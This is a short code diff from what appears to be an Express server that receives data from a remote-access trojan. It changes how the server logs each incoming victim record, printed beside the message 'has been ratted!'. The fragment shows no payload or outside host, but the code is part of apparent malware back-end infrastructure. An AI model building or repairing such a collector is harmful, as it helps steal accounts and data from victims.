@@ -83,7 +83,7 @@ app.post("/", (req, res) => {
                 })
             }
 
-            console.log(`${req.body.username} has been ratted!\n${JSON.parse(req.body)}`)
+            console.log(`${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
         }
     })
 
